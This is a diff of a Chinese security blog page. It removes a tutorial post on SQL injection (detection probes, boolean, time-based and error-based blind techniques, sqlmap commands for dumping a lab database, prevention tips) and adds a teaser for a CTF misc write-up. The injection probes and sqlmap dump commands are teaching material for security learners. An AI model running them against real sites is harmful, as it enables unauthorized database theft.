-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SQL注入的本质"><a class="header-anchor" href="#SQL注入的本质">¶</a>SQL注入的本质</h2>
-<p>注入攻击的<em>本质: 把用户输入的数据当做代码执行</em>。</p>
-<p><strong>两个关键条件：</strong></p>
-<ol>
-<li>
-<p>用户能够控制输入</p>
-</li>
-<li>
-<p>原本程序要执行的代码，拼接用户输入数据被执行</p>
-</li>
-</ol>
-<h2 id="手工测试"><a class="header-anchor" href="#手工测试">¶</a>手工测试</h2>
-<p>但很多时候，Web服务器关闭了错误回显，这时候我们该怎样实行SQL注入了呢？</p>
-<h3 id="判断是否存在注入"><a class="header-anchor" href="#判断是否存在注入">¶</a>判断是否存在注入</h3>
-<p>二话不说，先加单引号’、双引号”、单括号)、双括号)）等看看是否报错，如果报错就可能存在<code>SQL</code>注入漏洞了。<br>
-还有在URL后面加and 1=1,and 1=2看页面是否显示一样，显示不一样的话，在判断是字符型还是数字型，肯定存在SQL注入漏洞了。还有就是<code>Timing Attack</code>测试，也就是时间盲注。有时候通过简单的条件语句比如<code>and 1=2</code>是无法看出异常的。</p>
-<p><strong>报错查询注入</strong><br>
-利用前提：页面上没有显示位，但是需要输出SQL语句执行错误信息。</p>
-<p><strong>盲注的类型</strong></p>
-<p>SQL注入常用函数,盲注—般分为三种</p>
-<p><strong>基于布尔型的盲注：</strong></p>
-<p>left(a,b)从左截取a 的前b位：left(database(),1) &gt; ‘s’<br>
-substr(a,b,c)从b位置开始，截取字符串a的c长度<br>
-ascii() 将某个字符转换为ascii值：ascii(substr(user),1,1)=101#<br>
-mid(a,b,c)从位置b开始，截取a字符串的c位 regexp正则表达式的用法<br>
-user()结果位root ，regexp为匹配root的正则表达式：select user()’</p>
-<p><strong>基于时间的盲注：</strong></p>
-<p><code>benchmark(count，expr)</code>函数<br>
-<code>sleep(time)</code>函数<br>
-前者通过将<code>expr</code>语句执行<code> count</code>次来到达延迟的目的，后者是直接延迟time时间<br>
-<code>benchmark</code>是一个内置函数，其作用是来测试一写函数的执行速度，<code>benchmark（）</code>其中有两个参数，<br>
-第一个是执行次数，另一个是要执行的函数或者表达式。</p>
-<p><strong>基于报错注入：</strong></p>
-<p>报错顾名思义，就是使语句报错。报错注入则是注入特殊的语句使报错回显中带上我们需要的信息。报错盲注也是三种盲注中效率最高的，常见的报错回显有三种函数extractvalue()、updatexml()、floor()</p>
-<h2 id="Sqlmap简介"><a class="header-anchor" href="#Sqlmap简介">¶</a>Sqlmap简介</h2>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
-<p>Sqlmap 是一个开源的渗透测试工具，可以用来进行自动化检测，能自动化利用 SQL 注入漏洞的过程，帮助你接管数据库服务器。</p>
-<p><strong>基础命令：</strong></p>
-<p>-u 指定注入点</p>
-<p>–dbs 跑库名</p>
-<p>–tables 跑表名</p>
-<p>–columns 跑字段名</p>
-<p>–dump 枚举数据</p>
-<p><img src="https://static.sechelper.com/img/2022/11/22/e6513aacacae9659168fd4e8e6bb5079.png" alt="image-20221122195227984"></p>
-<p><strong>sqlmap的简单使用</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u /Pass-05/index.php --forms --dbs</span><br></pre></td></tr></table></figure>
-<p>跑表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error --tables</span><br></pre></td></tr></table></figure>
-<p>字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag --columns</span><br></pre></td></tr></table></figure>
-<p>出数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-<p><strong>BP和Sqlmap联动</strong></p>
-<img src="https://static.sechelper.com/img/2022/11/22/8e3bacfc0df300ba6cccec5c529a7558.png" alt="image-20221122195617983" style="zoom:80%;" />
-<p><img src="https://static.sechelper.com/img/2022/11/22/e4ff6f535dee351fc7954a210001475c.png" alt="image-20221122195711501"></p>
-<h2 id="如何预防sql注入？防止sql注入的方式有哪些？"><a class="header-anchor" href="#如何预防sql注入？防止sql注入的方式有哪些？">¶</a>如何预防sql注入？防止sql注入的方式有哪些？</h2>
-<ol>
-<li>普通用户与系统管理员用户的权限要有严格的区分。</li>
-<li>强迫使用参数化语句</li>
-<li>必要的情况下使用专业的漏洞扫描工具来寻找可能被攻击的点。</li>
-<li>使用预编译</li>
-</ol>
 
       
     </div>
@@ -1641,6 +1596,90 @@ user()结果位root ，regexp为匹配root的正则表达式：select user()’<
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/20221123/vulnerability-researching/ghostcat-CVE-2020-1938/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20221122/ctf/unctf-misc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/20221122/ctf/unctf-misc/" class="post-title-link" itemprop="url">UNCTF-misc 大学生竞赛解析（二）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-22 14:06:00" itemprop="dateCreated datePublished" datetime="2022-11-22T14:06:00+08:00">2022-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-27 09:44:43" itemprop="dateModified" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>作者：凉拌_@助安社区</strong></p>
+<h2 id="题目：MY-PICTURE"><a class="header-anchor" href="#题目：MY-PICTURE">¶</a>题目：MY PICTURE</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/22/9936ecb5269b17c676dcedce91a3815e.png" alt="img"></p>
+<p>打开发现是一个没后缀的文件</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/20221122/ctf/unctf-misc/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
